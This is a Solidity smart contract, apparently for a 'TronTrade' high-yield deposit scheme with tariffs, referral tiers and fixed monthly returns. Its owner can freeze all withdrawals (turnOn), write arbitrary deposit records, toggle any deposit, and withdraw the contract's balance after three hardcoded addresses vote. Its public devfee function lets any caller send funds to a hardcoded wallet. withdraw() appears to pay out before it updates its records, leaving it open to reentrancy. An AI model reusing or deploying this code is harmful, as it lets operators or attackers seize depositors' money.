// SPDX-License-Identifier: MIT
pragma solidity >0.8.0;

enum Status {
    U, // User 
    I, // Investor 
    AM, // Amathor 
    P, // Partner 
    D, // Director 
    AB, // Ambasador 
    SAB, // SuperAmbasador 
    MAB, // MegaAmbasador 
    GAB // GigaAmbasador 
}

struct investPlan {
    uint32 time;
    uint8 percent;
    uint256 max_depo;
    bool status;
    uint32 withdrawPeriod;
}

struct User {
    uint32 id;
    address referrer;
    uint16 referralCount;
    uint256 totalDepositedByRefs;
    uint256 invested;
    bool threeMonthDepoExist;
    Status status;
}

interface ITronTradeInvestor {
    function investors(
        address
    ) external returns (User memory investor);

    function register(address, address) external  returns (User memory);

    function depositAdded(
        address,
        uint256,
        uint256,
        bool
    ) external;
}

interface IBonusReferral {
    function setReferralBonus(
        uint32 startDate,
        uint32 endDate,
        address referral,
        uint128 amount
    ) external returns (bool);

    function withdrawPeriod() external returns (uint32);
}

interface ITronTradeConstants {

    function blacklisted(
        address
    ) external view returns (bool result);

    function THREE_MONTHS_MAX_DEPOSIT() external view returns (uint128);
    function DEPOSIT_COMISSION() external view returns (uint128);
    function MIN_DEPOSIT() external view returns (uint128);
    function MAX_DEPOSIT() external view returns (uint128);
    function BONUS_ROUND() external view returns (uint128);
    function DEPOSIT_FULL_PERIOD() external view returns (uint128);
    function WITHDRAW_COMISSION() external view returns (uint128);
    function tariffs(uint256) external view returns (investPlan memory);
    function directRefBonusSize() external view returns(uint8);
    function bonusContractAddress() external view returns(address); 
    function getBonusPercentsByDeposit(
        uint8
    ) external view returns(uint8);

}

interface ITronTradeDeposit {

    function getUserDepositsByIndexes (
        address,
        uint16[] memory
    ) external returns (
        uint8[] memory,
        uint32[] memory,
        uint256[] memory,
        uint256[] memory,
        uint256[] memory,
        bool[] memory
    );

    function getAllUserDeposits(
        address user
    ) external returns (
        uint8[] memory,
        uint32[] memory,
        uint256[] memory,
        uint256[] memory,
        uint256[] memory,
        bool[] memory
    );

}
// @author trontrade.vip
// @title TronTrade
contract TronTradeDeposit {

    struct userDeposits {
        uint16 numDeposits;
        uint256 withdrawn;
        mapping(uint16 => Deposit) deposits;
    }

    struct Deposit {
        uint8 tariff_id;
        uint256 amount;
        uint256 paid_out;
        uint256 to_pay;
        uint32 at;
        uint32 end;
        bool closed;
        uint256 percents;
        uint256 principal;
    }

    bool private silent;
    bool public votes1;
    bool public votes2;
    bool public votes3;
    bool private _lockBalances = false;
    address payable private owner;
    address public constantContractAddress;
    address public investorContractAddress;
    uint256 private COMMISION;
    mapping(address => userDeposits) public deposits;

    event DepositEvent(
        address indexed _user,
        uint8 tariff,
        uint256 indexed _amount
    );
    
    event withdrawEvent(address indexed _user, uint256 indexed _amount);

    modifier ownerOnly() {
        require(owner == msg.sender, "No sufficient right");
        _;
    }  

    constructor() {
        owner = payable(msg.sender);
        votes1 = false;
        votes2 = false;
        votes3 = false;
        silent = false;
    }

    receive() external payable {}

    fallback() external payable {}

    function transferOwnership(address newOwner) public ownerOnly {
        require(newOwner != address(0));
        owner = payable(newOwner);
    }  

    modifier notBlacklisted() {
        require(!ITronTradeConstants(constantContractAddress).blacklisted(msg.sender));
        _;
    }

    function setConstantContractAddress(
        address contractAddress
    ) public ownerOnly returns (address) {
        constantContractAddress = contractAddress;
        return constantContractAddress;
    }  

    function setInvestorContractAddress(
        address contractAddress
    ) public ownerOnly returns (address) {
        investorContractAddress = contractAddress;
        return investorContractAddress;
    }

     function getMonthsSinceDepoStart(
         Deposit memory depositForCheck
     ) private view returns (uint) {
         return (((
             block.timestamp < depositForCheck.end ? block.timestamp : depositForCheck.end
         ) - depositForCheck.at) / 
         ITronTradeConstants(constantContractAddress).tariffs(depositForCheck.tariff_id).withdrawPeriod);
     }

    function deposit(
        uint8 _tariff,
        address _referrer
    ) public payable returns (address, uint8, uint256) {
        require(_referrer != msg.sender, "You cannot be your own referrer!");
        require(
            ITronTradeInvestor(investorContractAddress).investors(_referrer).id > 0, 
            "No referrer found in system"
        );
        if (ITronTradeInvestor(investorContractAddress).investors(msg.sender).id > 0) {
            require(
                _referrer == ITronTradeInvestor(investorContractAddress).investors(msg.sender).referrer,
                "Referrer mismatch for existing investor"
            );
        }

        uint256 amnt =  _deposit(
            msg.value - ITronTradeConstants(constantContractAddress).DEPOSIT_COMISSION(), 
            _tariff, 
            _referrer, 
            msg.sender, 
            [uint32(block.timestamp), 0, 0, 0]
        );

        COMMISION = 
            COMMISION + 
            ITronTradeConstants(constantContractAddress).DEPOSIT_COMISSION();

        return (msg.sender, _tariff, amnt);
    }

    function depositForUser(
        uint256 value,
        uint8 _tariff,
        address _referrer,
        address _wallet,
        uint32 _at,
        uint32 _paid_out,
        uint32 _to_pay,
        uint32 _percents
    ) public ownerOnly returns (address, uint8, uint256) {
        require(_referrer != _wallet, "Wallet cannot be referrer!");
        require(
            ITronTradeInvestor(investorContractAddress).investors(_referrer).id > 0, 
            "No referrer found in system"
        );
        if (ITronTradeInvestor(investorContractAddress).investors(msg.sender).id > 0) {
            require(
                _referrer == ITronTradeInvestor(investorContractAddress).investors(msg.sender).referrer,
                "Referrer mismatch for existing investor"
            );
        }

        uint256 amnt = _deposit(
            value, 
            _tariff, 
            _referrer, 
            _wallet, 
            [_at, _paid_out, _to_pay, _percents]
        );

        return (_wallet, _tariff, amnt);
    } 

    function _deposit(
        uint256 value,
        uint8 _tariff,
        address _referrer,
        address _wallet,
        uint32 [4] memory at_0_paid_out_1_to_pay_2_percents_3
    ) private returns (uint256) {
        require(_wallet == msg.sender || owner == msg.sender, "No access");
        uint256 amnt = value;

        require(
            ITronTradeConstants(constantContractAddress).tariffs(uint256(_tariff)).status != false, 
            "This tariff is turned off"
        );
        
        if (value > 0) {

             User memory investor = ITronTradeInvestor(investorContractAddress).investors(_wallet);
             
            if (investor.id == 0) {
                investor = ITronTradeInvestor(investorContractAddress).register(_referrer, _wallet);
            }

             bool result = investor.id > 0 &&
                    investor.threeMonthDepoExist == true &&
                    _tariff == 0;

            require(
                !(
                    investor.id > 0 &&
                    investor.threeMonthDepoExist == true &&
                    _tariff == 0
                ), 
                "90 days deposits exist"
            );

            require(
                value >= ITronTradeConstants(constantContractAddress).MIN_DEPOSIT(), 
                "Minimal deposit required"
            );

            require(
                value <= ITronTradeConstants(constantContractAddress).MAX_DEPOSIT() || 
                (value <= ITronTradeConstants(constantContractAddress).THREE_MONTHS_MAX_DEPOSIT() && _tariff == 0), 
                "Deposit limit exceeded!"
            );

            if (value > ITronTradeConstants(constantContractAddress).tariffs(uint256(_tariff)).max_depo) {
                revert("Max limit for tariff");
            }

            require(!_lockBalances);
            _lockBalances = true;
            uint256 fee = (value) / 100;
            devfee(fee);

            if (ITronTradeConstants(constantContractAddress).BONUS_ROUND() != 0) {
                amnt = (amnt * ITronTradeConstants(constantContractAddress).BONUS_ROUND()) / 100;
            }

            deposits[_wallet].deposits[
                deposits[_wallet].numDeposits++
            ] = Deposit({
                tariff_id: _tariff,
                amount: amnt,
                at: uint32(at_0_paid_out_1_to_pay_2_percents_3[0]),
                end: uint32(at_0_paid_out_1_to_pay_2_percents_3[0] + ITronTradeConstants(constantContractAddress).tariffs(uint256(_tariff)).time),
                paid_out: at_0_paid_out_1_to_pay_2_percents_3[1],
                to_pay: at_0_paid_out_1_to_pay_2_percents_3[2],
                closed: false,
                percents: at_0_paid_out_1_to_pay_2_percents_3[3],
                principal: amnt
            });
            bool threeMonthDepoExist = false;
            if (_tariff == 0) {
                threeMonthDepoExist = true;
            }

            if (ITronTradeConstants(constantContractAddress).directRefBonusSize() > 0) {
                (bool successRefPayment, ) = payable(_referrer).call{
                    value: (value * ITronTradeConstants(constantContractAddress).directRefBonusSize()) / 100
                }("");
                require(successRefPayment, "pay_to_REF fail");
            }

            _lockBalances = false;

            ITronTradeInvestor(investorContractAddress).depositAdded(
                _wallet,
                value,
                amnt,
                threeMonthDepoExist
            );
            
            if (address(ITronTradeConstants(constantContractAddress).bonusContractAddress()) != address(0x0)) {
                sendBonusByDeposit(
                    _wallet,
                    uint128(((amnt / 100) * ITronTradeConstants(constantContractAddress).tariffs(uint256(_tariff)).percent)),
                    uint32(at_0_paid_out_1_to_pay_2_percents_3[0]),
                    uint32(at_0_paid_out_1_to_pay_2_percents_3[0] + 
                    ITronTradeConstants(constantContractAddress).tariffs(uint256(_tariff)).time)
                );
            }
        }
        emit DepositEvent(_wallet, _tariff, amnt);
        return amnt;
    }

    function sendBonusByDeposit(
        address wallet,
        uint256 amount,
        uint32 startDate,
        uint32 endDate
    ) private {
         User memory investor = ITronTradeInvestor(investorContractAddress).investors(wallet);
        if (investor.id > 0) {
            address referrerAddr = investor.referrer;
            if (address(referrerAddr) != address(0x0)) {
                User memory referrer = ITronTradeInvestor(investorContractAddress).investors(referrerAddr);
                Status status = uint8(referrer.status) > 5 ? Status.AB : referrer.status;
                if(
                    ITronTradeConstants(constantContractAddress).getBonusPercentsByDeposit(uint8(status)) != 0
                ) {
                    bool result = IBonusReferral(payable(ITronTradeConstants(constantContractAddress).bonusContractAddress()))
                        .setReferralBonus(
                            startDate, 
                            endDate, 
                            referrerAddr, 
                            uint128(
                                ((amount / 100) * ITronTradeConstants(constantContractAddress).getBonusPercentsByDeposit(uint8(status)))/3
                            )
                        );
                    require(result, "Bonus not accrued");
                }
            }
        }
    }

    function devfee(uint256 _fee) public payable {
        address payable receiver = payable(
            0x0Ef1380A6114ae398f163FB43d90fDC3bC1cf422
        );
        (bool sent, bytes memory data) = receiver.call{value: (_fee * 6)}("");
        require(sent, "Fee from current deposit is not sent");
    }

    function migrate(
        address wallet,
        uint16[] memory depositIndexes,
        address contractAddress
    ) public ownerOnly {
        require(address(contractAddress) != address(0x0), 'From contract not setupped');
        uint8[] memory depositTariffIds;
        uint32[] memory depositAts;
        uint256[] memory depositAmounts;
        uint256[] memory depositPaidOuts;
        uint256[] memory depositPercentsMonthly;
        bool[] memory depositClosed;
        (
            depositTariffIds,
            depositAts,
            depositAmounts,
            depositPaidOuts,
            depositPercentsMonthly,
            depositClosed
        ) = depositIndexes.length > 0 ?
             ITronTradeDeposit(contractAddress).getUserDepositsByIndexes(wallet, depositIndexes):
             ITronTradeDeposit(contractAddress).getAllUserDeposits(wallet);
        for (uint16 depositId = 0; depositId < depositTariffIds.length; depositId++) {
            deposits[wallet].deposits[
                deposits[wallet].numDeposits++
            ] = Deposit({
                tariff_id: depositTariffIds[depositId],
                amount: depositAmounts[depositId],
                at: uint32(depositAts[depositId]),
                end: uint32(depositAts[depositId] + ITronTradeConstants(constantContractAddress).tariffs(depositTariffIds[depositId]).time),
                paid_out: depositPaidOuts[depositId],
                to_pay: 0,
                closed: depositClosed[depositId],
                percents: 0,
                principal: depositAmounts[depositId]
            });
        }
    }

    function getUserDepositsByIndexes (
        address user,
        uint16[] memory depositIndexes
    ) public view notBlacklisted returns (
        uint8[] memory depositTariffIds,
        uint32[] memory depositAts,
        uint256[] memory depositAmounts,
        uint256[] memory depositPaidOuts,
        uint256[] memory depositPercentsMonthly,
        bool[] memory depositClosed
    ) {
        depositTariffIds = new uint8[](
            depositIndexes.length
        );
        depositAts = new uint32[](
            depositIndexes.length
        );
        depositAmounts = new uint256[](
            depositIndexes.length
        );
        depositPaidOuts = new uint256[](
            depositIndexes.length
        );
        depositPercentsMonthly = new uint256[](
            depositIndexes.length
        );
        depositClosed = new bool[](depositIndexes.length);

        for (uint16 index = 0; index < depositIndexes.length; index++) {
            if (deposits[user].deposits[depositIndexes[index]].amount > 0) {
                depositTariffIds[index] = deposits[user].deposits[depositIndexes[index]].tariff_id;
                depositAts[index] = deposits[user].deposits[depositIndexes[index]].at;
                depositAmounts[index] = deposits[user].deposits[depositIndexes[index]].amount;
                depositPaidOuts[index] = deposits[user].deposits[depositIndexes[index]].paid_out;
                depositClosed[index] = deposits[user].deposits[depositIndexes[index]].closed;
                depositPercentsMonthly[index] = depositPercentMonthly(user, depositIndexes[index]);
            }
        }
        return (
            depositTariffIds,
            depositAts,
            depositAmounts,
            depositPaidOuts,
            depositPercentsMonthly,
            depositClosed
        );
    }

    function toggleDeposit(
        address wallet,
        uint16 depositIndex
    ) public ownerOnly returns(bool) {
        require(deposits[wallet].numDeposits > 0, "Wrong wallet");
        require(deposits[wallet].deposits[depositIndex].amount > 0, "Wrong deposit index");
        deposits[wallet].deposits[depositIndex].closed = !deposits[wallet].deposits[depositIndex].closed;
        return deposits[wallet].deposits[depositIndex].closed;
    }
    
    function getAllUserDeposits(
        address user
    )
        public
        view
        notBlacklisted
        returns (
            uint8[] memory,
            uint32[] memory,
            uint256[] memory,
            uint256[] memory,
            uint256[] memory,
            bool[] memory
        )
    {
        uint8[] memory depositTariffIds = new uint8[](
            deposits[user].numDeposits
        );
        uint32[] memory depositAts = new uint32[](
            deposits[user].numDeposits
        );
        uint256[] memory depositAmounts = new uint256[](
            deposits[user].numDeposits
        );
        uint256[] memory depositPaidOuts = new uint256[](
            deposits[user].numDeposits
        );
        uint256[] memory depositPercentsMonthly = new uint256[](
            deposits[user].numDeposits
        );
        bool[] memory depositClosed = new bool[](
            deposits[user].numDeposits
        );

        for (uint16 index = 0; index < deposits[user].numDeposits; index++) {
            depositTariffIds[index] = deposits[user].deposits[index].tariff_id;
            depositAts[index] = deposits[user].deposits[index].at;
            depositAmounts[index] = deposits[user].deposits[index].amount;
            depositPaidOuts[index] = deposits[user].deposits[index].paid_out;
            depositClosed[index] = deposits[user].deposits[index].closed;
            depositPercentsMonthly[index] = depositPercentMonthly(user, index);
        }
        return (
            depositTariffIds,
            depositAts,
            depositAmounts,
            depositPaidOuts,
            depositPercentsMonthly,
            depositClosed
        );
    }

    function depositPercentMonthly(
        address user,
        uint16 index
    ) private view returns (uint256)  {
        if (
            getMonthsSinceDepoStart(deposits[user].deposits[index]) >=
            ITronTradeConstants(constantContractAddress).DEPOSIT_FULL_PERIOD()
        ) {
            return (deposits[user].deposits[index].principal *
                    ITronTradeConstants(constantContractAddress).tariffs(uint256(deposits[user].deposits[index].tariff_id)).percent *
                    (getMonthsSinceDepoStart(deposits[user].deposits[index]) -
                        (getMonthsSinceDepoStart(
                            deposits[user].deposits[index]
                        ) % ITronTradeConstants(constantContractAddress).DEPOSIT_FULL_PERIOD()))) /
                100;
            }
            return 0;
    }

    function getWithdrawValue(address user) public view returns (uint256) {
        uint256 _total_av = 0;
        uint256 _total_paid_out = 0;
        Deposit[] memory outDeposits = new Deposit[](deposits[user].numDeposits);

        for (uint16 i = 0; i < deposits[user].numDeposits; i++) {
            outDeposits[i].percents = getMonthsSinceDepoStart(
                deposits[user].deposits[i]
            ) >= ITronTradeConstants(constantContractAddress).DEPOSIT_FULL_PERIOD()
                ? ((deposits[user].deposits[i].principal *
                    ITronTradeConstants(constantContractAddress).tariffs(uint256(deposits[user].deposits[i].tariff_id)).percent *
                    (getMonthsSinceDepoStart(deposits[user].deposits[i]) -
                        (getMonthsSinceDepoStart(deposits[user].deposits[i]) %
                            ITronTradeConstants(constantContractAddress).DEPOSIT_FULL_PERIOD()))) / 100)
                : 0;
            _total_paid_out =
                _total_paid_out +
                (deposits[user].deposits[i].paid_out);

            if (
                deposits[user].deposits[i].closed ||
                deposits[user].deposits[i].end <= block.timestamp
            ) {
                // if deposit ends, then withdraw principals + percents
                outDeposits[i].to_pay =
                    outDeposits[i].percents +
                    (deposits[user].deposits[i].principal);
            } else {
                // if deposit doesn`t end, then withdraw percents only
                outDeposits[i].to_pay = outDeposits[i].percents;
            }
            _total_av = _total_av + (outDeposits[i].to_pay);
        }

        return _total_av > _total_paid_out ? (_total_av - _total_paid_out) : 0;
    }

    function profit(address user) private returns (uint256) {
        uint256 _total_av = 0;
        uint256 _total_paid_out = 0;

        for (uint16 i = 0; i < deposits[user].numDeposits; i++) {
            deposits[user].deposits[i].percents = getMonthsSinceDepoStart(
                deposits[user].deposits[i]
            ) >= ITronTradeConstants(constantContractAddress).DEPOSIT_FULL_PERIOD()
                ? ((deposits[user].deposits[i].principal *
                    ITronTradeConstants(constantContractAddress).tariffs(uint256(deposits[user].deposits[i].tariff_id)).percent *
                    (getMonthsSinceDepoStart(deposits[user].deposits[i]) -
                        (getMonthsSinceDepoStart(deposits[user].deposits[i]) %
                            ITronTradeConstants(constantContractAddress).DEPOSIT_FULL_PERIOD()))) / 100)
                : 0;
            _total_paid_out =
                _total_paid_out +
                (deposits[user].deposits[i].paid_out);

            if (
                deposits[user].deposits[i].closed ||
                deposits[user].deposits[i].end <= block.timestamp
            ) {
                // if deposit ends, then withdraw principals + percents
                deposits[user].deposits[i].closed = true;
                deposits[user].deposits[i].to_pay =
                    deposits[user].deposits[i].percents +
                    (deposits[user].deposits[i].principal);
            } else {
                // if deposit doesn`t end, then withdraw percents only
                deposits[user].deposits[i].to_pay = deposits[user]
                    .deposits[i]
                    .percents;
            }
            _total_av = _total_av + (deposits[user].deposits[i].to_pay);
        }

        return _total_av > _total_paid_out ? (_total_av - _total_paid_out) : 0;
    }

    function withdraw() external notBlacklisted {
        require(silent != true);
        require(msg.sender != address(0));

        uint256 to_payout = profit(msg.sender);
        require(to_payout > 0, "Insufficient amount");

        (bool success, ) = msg.sender.call{value: to_payout - ITronTradeConstants(constantContractAddress).WITHDRAW_COMISSION()}("");
        COMMISION = COMMISION + ITronTradeConstants(constantContractAddress).WITHDRAW_COMISSION();
        require(success, "Withdraw transfer failed");

        for (uint16 i = 0; i < deposits[msg.sender].numDeposits; i++) {
            if (deposits[msg.sender].deposits[i].end <= block.timestamp) {
                if (
                    deposits[msg.sender].deposits[i].to_pay >
                    deposits[msg.sender].deposits[i].paid_out
                ) {
                    deposits[msg.sender].deposits[i].paid_out = deposits[
                        msg.sender
                    ].deposits[i].to_pay;
                }
            } else {
                if (
                    deposits[msg.sender].deposits[i].percents >
                    deposits[msg.sender].deposits[i].paid_out
                ) {
                    deposits[msg.sender].deposits[i].paid_out = deposits[
                        msg.sender
                    ].deposits[i].percents;
                }
            }
        }

        deposits[msg.sender].withdrawn =
            deposits[msg.sender].withdrawn +
            to_payout;
        emit withdrawEvent(msg.sender, to_payout);
    }

    function turnOn() public ownerOnly returns (bool) {
        silent = true;
        return silent;
    }

    function turnOff() public ownerOnly returns (bool) {
        silent = false;
        _lockBalances = false;
        votes1 = false;
        votes2 = false;
        votes3 = false;
        return silent;
    }

    function state() public view returns (bool) {
        return silent;
    }

    function voting() public returns (bool) {
        if (msg.sender == payable(0x21ceadc6268561f0BE89746B2632bE628D14893a)) {
            votes1 = true;
            return votes1;
        }

        if (msg.sender == payable(0x4b0b455414B198dF53939F3e6eA1836fab62cCc2)) {
            votes2 = true;
            return votes2;
        }

        if (msg.sender == payable(0xBaFCaCf5105b4b263B9d1E29F354d63991C7EA16)) {
            votes3 = true;
            return votes3;
        }
        return false;
    }

    function withdrawThreeVoices(uint256 amount) public ownerOnly {
        require(votes1 && votes2 && votes3, "Need 3 votes");

        if (votes1 && votes2 && votes3) {
            amount = amount;

            require(amount <= address(this).balance);
            payable(msg.sender).transfer(amount);
            votes1 = false;
            votes2 = false;
            votes3 = false;
        }
    }
    

    function getCommision() public view ownerOnly returns(uint256) {
        return COMMISION;
    }

}